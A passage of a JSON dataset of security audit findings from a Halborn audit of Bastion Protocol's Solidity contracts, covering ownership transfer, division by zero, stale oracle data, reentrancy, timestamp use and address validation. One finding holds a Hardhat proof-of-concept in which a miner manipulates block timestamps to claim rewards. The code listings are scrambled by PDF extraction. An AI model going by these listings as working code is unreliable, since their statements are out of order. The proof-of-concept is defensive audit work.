confirmed that both the owner and pause guardian are controlled by the teams gnosis and will later be handed to the Timelock contract. 15 ",
        "labels": [
            "Halborn",
            "Bastion_Protocol_EVM_Contracts",
            "Severity: Medium"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT RECIPIENTS CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It is observed that the owner can transfer ownership of the contract However, such an operation does not require to a different address. a confirmation from the new owners address. Incorrect use of such functionality can lead to losing control over contracts, which could not be undone. Code Location: Listing 1: contracts/LockdropVaultV2.sol (Line 85) require ( newOwner != address (0) , \" DANGER : Attempted to set 82 function setOwner ( address newOwner ) external onlyOwner returns (  bool ) { 83  owner to 0\" ); 84  away ownership \"); 85 86 } require ( newOwner != address ( this ) , \" DANGER : Attempted to throw owner = newOwner ; Listing 2: contracts/Oracle/FluxOracle.sol (Line 112) address oldAdmin = admin ; admin = newAdmin ; 110 function setAdmin ( address newAdmin ) external onlyAdmin () { 111 112 113 114 115 } emit NewAdmin ( oldAdmin , newAdmin ); 16 Listing 3: contracts/Oracle/FluxOracleV1.sol (Line 102) address oldAdmin = admin ; admin = newAdmin ; 100 function setAdmin ( address newAdmin ) external onlyAdmin () { 101 102 103 104 105 } emit NewAdmin ( oldAdmin , newAdmin ); Listing 4: contracts/Oracle/NEAROracle.sol (Line 114) address oldAdmin = admin ; admin = newAdmin ; 112 function setAdmin ( address newAdmin ) external onlyAdmin () { 113 114 115 116 117 } emit NewAdmin ( oldAdmin , newAdmin ); Listing 5: contracts/Oracle/StNearFeedV1.sol (Line 41) address oldAdmin = admin ; admin = newAdmin ; 39 function setAdmin ( address newAdmin ) external onlyAdmin () { 40 41 42 43 44 } emit NewAdmin ( oldAdmin , newAdmin ); Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to split the ownership transfer functionality into owner setter and acceptOwnership functions. The latter function allows the transfer to be completed by the recipient. 17 Remediation Plan: The solved Bastion Protocol team SOLVED: commit 52f563f88f08f7ee7217fead1d03d8e50b8ccb33 for the FluxOracle contract, which was later renamed to BastionOracle. Furthermore, the Bastion Protocol team confirmed that only the BastionOracle contract will be used from now on, so other contracts reported in this finding are not corrected. issue this in 18 ",
        "labels": [
            "Halborn",
            "Bastion_Protocol_EVM_Contracts",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING DIVISION BY 0 CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The HomoraMath library defines divCeil and fdiv functions, which both implement a division. They are, however, missing the division by 0 check, which will cause an error if encountered. Code Location: Listing 6: contracts/HomoraMath.sol (Line 11) 10 function divCeil ( uint256 lhs , uint256 rhs ) internal pure returns (  uint256 ) { 11 12 } return lhs . add ( rhs ). sub (1) / rhs ; Listing 7: contracts/HomoraMath.sol (Line 19) 18 function fdiv ( uint256 lhs , uint256 rhs ) internal pure returns (  uint256 ) { 19 20 } return lhs . mul (2**112) / rhs ; Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to implement a validation mechanism, which will make sure that division by 0 scenarios are handled properly. 19 Remediation Plan: SOLVED: eea975f0489d636687d83fb69534c4c6b31b2e7e Bastion Protocol team The solved this issue in commit 20 ",
        "labels": [
            "Halborn",
            "Bastion_Protocol_EVM_Contracts",
            "Severity: Medium"
        ]
    },
    {
        "title": "USE OF DEPRECATED CHAINLINK API",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "LPOracle contracts use Chainlinks deprecated API The NEAROracle, latestAnswer(). Such functions might suddenly stop working if Chainlink This method will return the last stopped supporting deprecated APIs. value, but it is possible to check if the data is fresh. Code Location: Listing 8: contracts/Oracle/NEAROracle.sol (Lines 68,70,76,78) } else { if ( decimalDelta > 0) { if ( feed . decimals () > 18) { return uint ( feed . latestAnswer () ). div (10** decimalDelta ) // Chainlink USD - denominated feeds store answers at 8 decimals uint decimalDelta = uint ( feed . decimals () ). sub ( uint (18) ); 62 function getChainlinkPrice ( AggregatorV2V3Interface feed ) internal  view returns ( uint ) { 63 64 65 66 67 68  ; 69 70 71 72 73 74 75 76  ; 77 78 79 80 81 } uint decimalDelta = uint (18) . sub ( uint ( feed . decimals () )); // Ensure that we don 't multiply the result by 0 if ( decimalDelta > 0) { return uint ( feed . latestAnswer () ); return uint ( feed . latestAnswer () ); return uint ( feed . latestAnswer () ). mul (10** decimalDelta ) } } else { } else { } } 21 Listing 9: contracts/Oracle/LPOracle.sol (Lines 96,98) internal view returns ( uint256 ) 87 function getChainlinkPrice ( AggregatorV2V3Interface feed ) 88 89 90 91 { 92 93 94 95 96 97 98 99 100 } // Chainlink USD - denominated feeds store answers at 8 decimals uint256 decimalDelta = uint256 (18) . sub ( feed . decimals () ); // Ensure that we don 't multiply the result by 0 if ( decimalDelta > 0) { return uint256 ( feed . latestAnswer () ). mul (10** decimalDelta ); return uint256 ( feed . latestAnswer () ); } else { } Listing 10: contracts/Oracle/StNearFeed.sol (Lines 28-29) uint decimalsDelta = uint ( feedsDecimals ). sub ( uint ( decimals uint nearUsdPrice = uint ( nearUsdFeed . latestAnswer () ); uint stNearNearPrice = uint ( stNearNearFeed . latestAnswer () ); if ( feedsDecimals > decimals ) { 27 function latestAnswer () public view returns ( uint ) { 28 29 30 31 32  )); 33  decimalsDelta ); 34 35  )); 36  decimalsDelta ); 37 38 } } else { } return nearUsdPrice . mul ( stNearNearPrice ). div (10 ** return nearUsdPrice . mul ( stNearNearPrice ). mul (10 ** uint decimalsDelta = uint ( decimals ). sub ( uint ( feedsDecimals Listing 11: contracts/Oracle/StNearFeedV1.sol (Line 25) 24 function latestAnswer () public view returns ( uint ) { 25 26 27 } uint nearPrice = uint ( nearFeed . latestAnswer () ); return nearPrice . mul ( stNearPrice ); 22 Listing 12: contracts/Oracle/FluxOracle.sol (Lines 66,68,74,76) } else { if ( decimalDelta > 0) { if ( feed . decimals () > 18) { return uint ( feed . latestAnswer () ). div (10** decimalDelta ) // Chainlink USD - denominated feeds store answers at 8 decimals uint decimalDelta = uint ( feed . decimals () ). sub ( uint (18) ); 60 function getChainlinkPrice ( AggregatorV2V3Interface feed ) internal  view returns ( uint ) { 61 62 63 64 65 66  ; 67 68 69 70 71 72 73 74  ; 75 76 77 78 79 } uint decimalDelta = uint (18) . sub ( uint ( feed . decimals () )); // Ensure that we don 't multiply the result by 0 if ( decimalDelta > 0) { return uint ( feed . latestAnswer () ); return uint ( feed . latestAnswer () ); return uint ( feed . latestAnswer () ). mul (10** decimalDelta ) } } else { } else { } } Listing 13: contracts/Oracle/FluxOracleV1.sol (Lines 65,67) // Chainlink USD - denominated feeds store answers at 8 decimals uint decimalDelta = uint (18) . sub ( feed . decimals () ); // Ensure that we don 't multiply the result by 0 if ( decimalDelta > 0) { 60 function getChainlinkPrice ( AggregatorV2V3Interface feed ) internal  view returns ( uint ) { 61 62 63 64 65 66 67 68 69 } return uint ( feed . latestAnswer () ). mul (10** decimalDelta ); return uint ( feed . latestAnswer () ); } else { } 23 Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to use latestRoundData() method instead of latestAnswer (). This method allows executing some extra validations as shown as below: Listing 14: Extra Validations (Lines 2,3,4) 1 ( roundId , rawPrice , , updateTime , answeredInRound ) =  AggregatorV3Interface ( feed ). latestRoundData () ; 2  than 0 \"); 3 4 require ( updateTime != 0 , \" Round is in incompleted state \"); require ( answeredInRound >= roundId , \" Stale price \" ); require ( rawPrice > 0, \" Chainlink price cannot be lower Remediation Plan: The solved Bastion Protocol SOLVED: commit fbf52f880bfec7790194c7bd16d610cc8c17f9cb for the FluxOracle contract, Furthermore, the Bastion which was later renamed to BastionOracle. Protocol team confirmed that only the BastionOracle contract will be used from now on, so other contracts reported in this finding are not corrected. issue this in 24 ",
        "labels": [
            "Halborn",
            "Bastion_Protocol_EVM_Contracts",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING REENTRANCY GUARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "it is that tests, observed function claimReward updates During rewardAccrued[] variable after contacting an external address using transfer(), transfer() function is not prone to re-entrancy attacks, however this function maybe at risk if this functionality chance. Therefore, to protect against cross-function re-entrancy attacks, it By using this lock, an attacker may be necessary to use a mutex. can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. Code Location: Listing 15: contracts/RewardDistributor.sol (Lines 276,291) 525 526 527 528 529 530 531 532 function claimReward ( uint8 rewardType , address payable [] memory holders , CToken [] memory cTokens , bool borrowers , bool suppliers ) public payable { require ( rewardType < rewardAddresses . length , \" rewardType  is invalid \" ); 533 534 535 536 537 538 539 540 for ( uint256 i = 0; i < cTokens . length ; i ++) { CToken cToken = cTokens [i ]; require ( comptroller . isMarketListed ( address ( cToken )) , \" market must be listed \" ); if ( borrowers == true ) { Exp memory borrowIndex = Exp ({ mantissa : cToken .  borrowIndex () }) ; 541 updateRewardBorrowIndex ( 25 542 543 544 545 546 547 548 549 550 551 552 553 554 555 556 557 558 559 560 561 562 563 564  )); 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579  grantRewardInternal ( rewardType , address ( cToken ) , borrowIndex ); for ( uint256 j = 0; j < holders . length ; j ++) { distributeBorrowerReward ( rewardType , address ( cToken ) , holders [ j], borrowIndex ); rewardAccrued [ rewardType ][ holders [ j ]] = rewardType , holders [ j], rewardAccrued [ rewardType ][ holders [j ]] ); } } if ( suppliers == true ) { updateRewardSupplyIndex ( rewardType , address ( cToken for ( uint256 j = 0; j < holders . length ; j ++) { distributeSupplierReward ( rewardType , address ( cToken ) , holders [ j] ); rewardAccrued [ rewardType ][ holders [ j ]] = rewardType , holders [ j], rewardAccrued [ rewardType ][ holders [j ]]  grantRewardInternal ( ); } } } 26 Listing 16: contracts/RewardDistributor.sol (Line 312) 586 587 function grantRewardInternal ( uint8 rewardType , address payable  user , uint256 amount ) internal returns ( uint256 ) { 588 589 590 591 592 593 594 595 596 597 598 599 600 address rewardAddress = rewardAddresses [ rewardType ]; EIP20Interface reward = EIP20Interface ( rewardAddress ); uint256 rewardRemaining = reward . balanceOf ( address ( this )); if ( amount > 0 && amount <= rewardRemaining ) { reward . transfer ( user , amount ); return 0; } return amount ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: The functions on the code location section have missing nonReentrant modifiers. It is recommended to add OpenZeppelin ReentrancyGuard library to the project and use the nonReentrant modifier to avoid introducing future re-entrancy vulnerabilities. Remediation Plan: PENDING: The Bastion Protocol team will deploy a fix in the new BoostRewardDistributor in bastion-dao. 27 ",
        "labels": [
            "Halborn",
            "Bastion_Protocol_EVM_Contracts",
            "Severity: Low"
        ]
    },
    {
        "title": "BLOCK TIMESTAMP USAGE IN REWARD CALCULATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During manual reviews, the usage of block.timestamp as a part of a financial mechanism was noticed. block.timestamp can be influenced by miners to a certain degree. There is a risk associated with the miners colluding on time manipulation to influence those mechanisms. However, as the contracts audited here are designed to be deployed on Aurora EVM, which has significantly reduced block times compared to Ethereum, this findings severity is reduced. Code Location: Listing 17: contracts/Oracle/TwapFeed.sol (Line 121) { 115 function update () 116 117 118 119 120 121 122 123 external returns ( uint224 price , uint32 T ) require ( pair . initialized , \" TwapFeed : NOT_INITIALIZED \"); uint32 blockTimestamp = getBlockTimestamp () ; uint32 lastUpdateTimestamp = pair . latestIsSlotA ? pair . lastUpdateSlotA : pair .  lastUpdateSlotB ; 124 125 126 127 128 129 130 131 132 133 134  ; 135 uint256 priceCumulativeCurrent = getPriceCumulativeCurrent ( pair . asToken0 ); uint256 priceCumulativeLast ; if ( blockTimestamp - lastUpdateTimestamp >= MIN_T ) { // update price priceCumulativeLast = pair . latestIsSlotA ? pair . priceCumulativeSlotA : pair . priceCumulativeSlotB ; if ( pair . latestIsSlotA ) { pair . priceCumulativeSlotB = priceCumulativeCurrent pair . lastUpdateSlotB = blockTimestamp ; 28 136 137  ; 138 139 140 141 142 143 144 145 146 147 148 } else { pair . priceCumulativeSlotA = priceCumulativeCurrent pair . lastUpdateSlotA = blockTimestamp ; } pair . latestIsSlotA = ! pair . latestIsSlotA ; emit PriceUpdate ( uniswapV2Pair , priceCumulativeCurrent , blockTimestamp , ! pair . latestIsSlotA ); } else { // don 't update ; return price using previous  priceCumulative 149 150 151 152 153 154 155 156 157 lastUpdateTimestamp = pair . latestIsSlotA ? pair . lastUpdateSlotB : pair . lastUpdateSlotA ; priceCumulativeLast = pair . latestIsSlotA ? pair . priceCumulativeSlotB : pair . priceCumulativeSlotA ; } T = blockTimestamp - lastUpdateTimestamp ; // overflow is  desired 158 require (T >= MIN_T , \" TwapFeed : NOT_READY \" ); // reverts only  if the pair has just been initialized 159 160 // / is safe , and - overflow is desired price = toUint224 (( priceCumulativeCurrent -  priceCumulativeLast ) / T); 161 } Listing 18: contracts/RewardDistributor.sol (Lines 182,218) uint8 rewardType , CToken cToken , uint256 newSupplySpeed , uint256 newBorrowSpeed 153 function setRewardSpeedInternal ( 154 155 156 157 158 ) internal { 159 160 // Handle new supply speeed uint256 currentRewardSupplySpeed = rewardSupplySpeeds [  rewardType ][ 161 address ( cToken ) 29 162 163 164 ]; if ( currentRewardSupplySpeed != 0) { // note that JOE speed could be set to 0 to halt liquidity  rewards for a market 165 166 167 168 169 170 171 172 173 174 updateRewardSupplyIndex ( rewardType , address ( cToken )) ; } else if ( newSupplySpeed != 0) { // Add the JOE market require ( comptroller . isMarketListed ( address ( cToken )) , \" reward market is not listed \" ); if ( rewardSupplyState [ rewardType ][ address ( cToken ) ]. index  == 0 && 175 rewardSupplyState [ rewardType ][ address ( cToken ) ].  timestamp == 0 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 ) { rewardSupplyState [ rewardType ][ address ( cToken ) ] = RewardMarketState ({ index : rewardInitialIndex , timestamp : safe32 ( getBlockTimestamp () , \" block timestamp exceeds 32 bits \" ) }) ; } } if ( currentRewardSupplySpeed != newSupplySpeed ) { rewardSupplySpeeds [ rewardType ][ address ( cToken )] =  newSupplySpeed ; 191 emit RewardSupplySpeedUpdated ( rewardType , cToken ,  newSupplySpeed ); 192 193 194 195 } // Handle new borrow speed uint256 currentRewardBorrowSpeed = rewardBorrowSpeeds [  rewardType ][ 196 197 198 address ( cToken ) ]; if ( currentRewardBorrowSpeed != 0) { 30 199 // note that JOE speed could be set to 0 to halt liquidity  rewards for a market 200 Exp memory borrowIndex = Exp ({ mantissa : cToken . borrowIndex  () }) ; 201 updateRewardBorrowIndex ( rewardType , address ( cToken ) ,  borrowIndex ); 202 203 204 205 206 207 208 209 210 } else if ( newBorrowSpeed != 0) { // Add the JOE market require ( comptroller . isMarketListed ( address ( cToken )) , \" reward market is not listed \" ); if ( rewardBorrowState [ rewardType ][ address ( cToken ) ]. index  == 0 && 211 rewardBorrowState [ rewardType ][ address ( cToken ) ].  timestamp == 0 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 ) { rewardBorrowState [ rewardType ][ address ( cToken ) ] = RewardMarketState ({ index : rewardInitialIndex , timestamp : safe32 ( getBlockTimestamp () , \" block timestamp exceeds 32 bits \" ) }) ; } } if ( currentRewardBorrowSpeed != newBorrowSpeed ) { rewardBorrowSpeeds [ rewardType ][ address ( cToken )] =  newBorrowSpeed ; 227 emit RewardBorrowSpeedUpdated ( rewardType , cToken ,  newBorrowSpeed ); 228 229 } } Listing 19: contracts/RewardDistributor.sol (Line 244) 236 function updateRewardSupplyIndex ( uint8 rewardType , address cToken ) 237 238 { internal 31 239 require ( rewardType < rewardAddresses . length , \" rewardType is  invalid \" ); 240 RewardMarketState storage supplyState = rewardSupplyState [  rewardType ][ cToken ]; uint256 supplySpeed = rewardSupplySpeeds [ rewardType ][ cToken ]; uint256 blockTimestamp = getBlockTimestamp () ; uint256 deltaTimestamps = sub_ ( blockTimestamp , uint256 ( supplyState . timestamp ) ); if ( deltaTimestamps > 0 && supplySpeed > 0) { uint256 supplyTokens = CToken ( cToken ). totalSupply () ; uint256 rewardAccrued = mul_ ( deltaTimestamps , supplySpeed ) Double memory ratio = supplyTokens > 0 ? fraction ( rewardAccrued , supplyTokens ) : Double ({ mantissa : 0}) ; Double memory index = add_ ( Double ({ mantissa : supplyState . index }) , ratio ); rewardSupplyState [ rewardType ][ cToken ] = RewardMarketState index : safe224 ( index . mantissa , \" new index exceeds 224 241 242 243 244 245 246 247 248 249 250 251  ; 252 253 254 255 256 257 258 259  ({ 260  bits \") , 261 262 263 264 265 266 267 268 269 270 271 272 } timestamp : safe32 ( blockTimestamp , \" block timestamp exceeds 32 bits \" ) }) ; } else if ( deltaTimestamps > 0) { supplyState . timestamp = safe32 ( blockTimestamp , \" block timestamp exceeds 32 bits \" ); } 32 Listing 20: contracts/RewardDistributor.sol (Line 290) 280 function updateRewardBorrowIndex ( 281 282 283 284 ) internal { 285 uint8 rewardType , address cToken , Exp memory marketBorrowIndex require ( rewardType < rewardAddresses . length , \" rewardType is  invalid \" ); 286 RewardMarketState storage borrowState = rewardBorrowState [  rewardType ][ 287 288 289 290 291 292 293 294 295 296 297 298 299 300  ; 301 302 303 304 305 306 307 308 cToken ]; uint256 borrowSpeed = rewardBorrowSpeeds [ rewardType ][ cToken ]; uint256 blockTimestamp = getBlockTimestamp () ; uint256 deltaTimestamps = sub_ ( blockTimestamp , uint256 ( borrowState . timestamp ) ); if ( deltaTimestamps > 0 && borrowSpeed > 0) { uint256 borrowAmount = div_ ( CToken ( cToken ). totalBorrows () , marketBorrowIndex ); uint256 rewardAccrued = mul_ ( deltaTimestamps , borrowSpeed ) Double memory ratio = borrowAmount > 0 ? fraction ( rewardAccrued , borrowAmount ) : Double ({ mantissa : 0}) ; Double memory index = add_ ( Double ({ mantissa : borrowState . index }) , ratio ); rewardBorrowState [ rewardType ][ cToken ] = RewardMarketState index : safe224 ( index . mantissa , \" new index exceeds 224  ({ 309  bits \") , 310 311 312 313 314 315 316 317 timestamp : safe32 ( blockTimestamp , \" block timestamp exceeds 32 bits \" ) }) ; } else if ( deltaTimestamps > 0) { borrowState . timestamp = safe32 ( blockTimestamp , 33 \" block timestamp exceeds 32 bits \" 318 319 320 321 } ); } Risk Level: Likelihood - 2 Impact - 2 Proof Of Concept: Listing 21 1 import { expect } from \" ./ chai - setup \" ; 2 3 import { ethers } from \" hardhat \" ; 4 import { parseEther , parseUnits } from \" ethers / lib / utils \" ; 5 import { BigNumber } from \" ethers \" ; 6 import { CErc20 , 7 Comptroller , 8 FaucetToken , 9 10 RewardDistributor , 11 } from \" ../ typechain - types \"; 12 import { 13 14 15 16 17 } from \" ./ common / Compound \" ; 18 import { SignerWithAddress } from \" @nomiclabs / hardhat - ethers /  signers \" ; 19 20 describe ( \" BSTN Liquidity Mining \" , function () { 21 22 23 24 25 26 let rewardDistributor : RewardDistributor ; let comptroller : Comptroller ; let BSTN : FaucetToken ; makeCErc20 , makeComptroller , makeRewardDistributor , makeToken , let alice : SignerWithAddress ; let malicious_miner : SignerWithAddress ; 34 [, alice , malicious_miner ] = await ethers . getSigners () ; let NEAR : FaucetToken ; let cNEAR : CErc20 ; before ( async function () { BSTN = await makeToken ({ name : \" Bastion \" , symbol : \" BSTN \" , decimals : 18 , }) ; rewardDistributor = await makeRewardDistributor () ; await BSTN . mint ( rewardDistributor . address , parseUnits ( \" 4000000 \" comptroller = await makeComptroller ({ rewardDistributor : rewardDistributor . address , NEAR = await makeToken ({ name : \" NEAR \" , symbol : \" NEAR \" , decimals : 24 , }) ; cNEAR = await makeCErc20 ({ comptroller , name : \" Bastion NEAR \" , symbol : \" cNEAR \" , underlying : NEAR , supportMarket : true , collateralFactor : parseEther ( \" 0.4 \" ) , await rewardDistributor . addRewardAddress ( BSTN . address ); await rewardDistributor . _setRewardSpeed ( 0, cNEAR . address , 0, parseEther (\" 0.01 \" ) }) ; 27 28 29 30 31 32 33 34 35 36 37 38 39  , 18) ); 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 }) ; }) ; ); 35 const ALICE_DEPOSIT_AMOUNT = \" 1 \"; const ALICE_BORROW_AMOUNT = \" 0.4 \" ; it ( \" BSTN Distribution Without Timestamp Manipulation \" , async () const underlyingDecimals = await NEAR . decimals () ; await NEAR . mint ( alice . address , parseUnits ( ALICE_DEPOSIT_AMOUNT , underlyingDecimals ) await NEAR . connect ( alice ). approve ( cNEAR . address , ethers . constants . MaxUint256 ); await cNEAR await cNEAR . connect ( alice ) . mint ( parseUnits ( ALICE_DEPOSIT_AMOUNT , underlyingDecimals )) ; . connect ( alice ) . borrow ( parseUnits ( ALICE_BORROW_AMOUNT , underlyingDecimals )); console . log ( \"\" ); console . log ( \" Normal user ( Alice ) borrows 0.4 and deposits 1 \" ); await ethers . provider . send (\" evm_increaseTime \" , [10000]) ; console . log ( \" Time passes evm_increaseTime , [10000] \" ); await rewardDistributor . connect ( alice ) [ \" claimReward ( uint8 , address )\" ](0 , alice . address ); const BSTNBalance = await BSTN . balanceOf ( alice . address ); console . log ( \" Alice claims rewards \" ) console . log ( BSTNBalance ); expect ( BSTNBalance ). to . be . gt ( BigNumber . from (0) ) ; ); 70 71 72  => { 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 }) ; 112 }) ; 36 113 describe ( \" BSTN Liquidity Mining ( Manipulated timestamp )\" , function  () { 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 let alice : SignerWithAddress ; let malicious_miner : SignerWithAddress ; let rewardDistributor : RewardDistributor ; let comptroller : Comptroller ; let BSTN : FaucetToken ; let NEAR : FaucetToken ; let cNEAR : CErc20 ; before ( async function () { [, alice , malicious_miner ] = await ethers . getSigners () ; BSTN = await makeToken ({ name : \" Bastion \" , symbol : \" BSTN \" , decimals : 18 , }) ; rewardDistributor = await makeRewardDistributor () ; await BSTN . mint ( rewardDistributor . address , parseUnits ( \" 4000000 \"  , 18) ); 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 comptroller = await makeComptroller ({ rewardDistributor : rewardDistributor . address , }) ; NEAR = await makeToken ({ name : \" NEAR \" , symbol : \" NEAR \" , decimals : 24 , }) ; cNEAR = await makeCErc20 ({ comptroller , name : \" Bastion NEAR \" , symbol : \" cNEAR \" , underlying : NEAR , supportMarket : true , collateralFactor : parseEther ( \" 0.4 \" ) , }) ; await rewardDistributor . addRewardAddress ( BSTN . address ); await rewardDistributor . _setRewardSpeed ( 37 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 0, cNEAR . address , 0, parseEther (\" 0.01 \" ) ); }) ; const ALICE_DEPOSIT_AMOUNT = \" 1 \"; const ALICE_BORROW_AMOUNT = \" 0.4 \" ; it ( \" BSTN Distribution With Timestamp Manipulation \" , async () => { await rewardDistributor . _setRewardSpeed ( 0, cNEAR . address , 0, parseEther (\" 0.01 \" ) ); const underlyingDecimals = await NEAR . decimals () ; await NEAR . mint ( malicious_miner . address , parseUnits ( ALICE_DEPOSIT_AMOUNT , underlyingDecimals ) ); await NEAR . connect ( malicious_miner ). approve ( cNEAR . address , ethers . constants . MaxUint256 ); await cNEAR . connect ( malicious_miner ) . mint ( parseUnits ( ALICE_DEPOSIT_AMOUNT , underlyingDecimals )) ; await cNEAR . connect ( malicious_miner ) . borrow ( parseUnits ( ALICE_BORROW_AMOUNT , underlyingDecimals )); console . log ( \" \"); console . log ( \" Malicious user ( Miner ) borrows 0.4 and deposits  1 \"); 193 194 await ethers . provider . send ( \" evm_increaseTime \" , [10015]) ; console . log ( \" Time passes evm_increaseTime , [10015] ,  Malicious miner manipulates block timestamp +15 \" ); 195 196 38 197 198 199 200 201 await rewardDistributor . connect ( malicious_miner ) [ \" claimReward ( uint8 , address )\" ](0 , malicious_miner . address ); const BSTNBalance = await BSTN . balanceOf ( malicious_miner .  address ); console . log ( \" Malicious miner claims rewards \") console . log ( BSTNBalance ); expect ( BSTNBalance ). to . be . gt ( BigNumber . from (0) ) ; 202 203 204 205 206 207 208 }) ; 209 }) ; Recommendation: It is recommended to use block.number instead of block.timestamp to reduce the risk of MEV attacks. Remediation Plan: RISK ACCEPTED: The Bastion Protocol team accepted the risk of this finding. 39 ",
        "labels": [
            "Halborn",
            "Bastion_Protocol_EVM_Contracts",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ADDRESS VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Multiple contracts are missing a safety check inside their constructors and multiple functions. Setters of address type parameters should include a zero-address check. Otherwise, contracts functionalities may become inaccessible or tokens are burnt forever. Code Location: Listing 22: contracts/LockdropVaultV2.sol (Line 34) require ( claimUnlockTime_ > now , \" claim unlock time is before address ctoken_ , uint256 claimUnlockTime_ ) public { 28 constructor ( string memory name_ , 29 30 31 32  current time \"); 33 34 35 36 37 } name = name_ ; ctoken = ctoken_ ; claimUnlockTime = claimUnlockTime_ ; owner = msg . sender ; Listing 23: contracts/Oracle/FluxOracle.sol (Line 112) address oldAdmin = admin ; admin = newAdmin ; 110 function setAdmin ( address newAdmin ) external onlyAdmin () { 111 112 113 114 115 } emit NewAdmin ( oldAdmin , newAdmin ); 40 Listing 24: contracts/Oracle/FluxOracleV1.sol (Line 102) address oldAdmin = admin ; admin = newAdmin ; 100 function setAdmin ( address newAdmin ) external onlyAdmin () { 101 102 103 104 105 } emit NewAdmin ( oldAdmin , newAdmin ); Listing 25: contracts/Oracle/NEAROracle.sol (Line 114) address oldAdmin = admin ; admin = newAdmin ; 112 function setAdmin ( address newAdmin ) external onlyAdmin () { 113 114 115 116 117 } emit NewAdmin ( oldAdmin , newAdmin ); Listing 26: contracts/Oracle/StNearFeed.sol (Lines 17,18) nearUsdFeed = AggregatorV2V3Interface ( _nearUsdFeed ); stNearNearFeed = AggregatorV2V3Interface ( _stNearNearFeed ); 16 constructor ( address _nearUsdFeed , address _stNearNearFeed ) public  { 17 18 19 20 21 22 23  stNearNearDecimals , \" overflow \"); 24 } uint8 nearUsdDecimals = nearUsdFeed . decimals () ; uint8 stNearNearDecimals = stNearNearFeed . decimals () ; feedsDecimals = nearUsdDecimals + stNearNearDecimals ; require ( feedsDecimals >= nearUsdDecimals && feedsDecimals >= Listing 27: contracts/Oracle/StNearFeedV1.sol (Line 19) 17 constructor ( uint _stNearPrice , address _nearFeed ) public { 18 19 20 21 } admin = msg . sender ; nearFeed = AggregatorV2V3Interface ( _nearFeed ); stNearPrice = _stNearPrice ; 41 Listing 28: contracts/Oracle/StNearFeedV1.sol (Line 30) 29 function setNearFeed ( address _nearFeed ) public onlyAdmin { 30 nearFeed = AggregatorV2V3Interface ( _nearFeed ); 31 } Listing 29: contracts/Oracle/StNearFeedV1.sol (Line 41) address oldAdmin = admin ; admin = newAdmin ; 39 function setAdmin ( address newAdmin ) external onlyAdmin () { 40 41 42 43 44 } emit NewAdmin ( oldAdmin , newAdmin ); Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. Remediation Plan: The solved Bastion Protocol team SOLVED: commit 52f563f88f08f7ee7217fead1d03d8e50b8ccb33 for the FluxOracle contract, which was later renamed to BastionOracle. Furthermore, the Bastion Protocol team confirmed that only the BastionOracle contract will be used from now on, so other contracts reported in this finding are not corrected. issue this in 42 ",
        "labels": [
            "Halborn",
            "Bastion_Protocol_EVM_Contracts",
            "Severity: Low"
        ]
    },
    {
        "title": "UNNECESSARY REQUIRE STATEMENT IN CONSTRUCTOR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bastion_Protocol_EVM_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
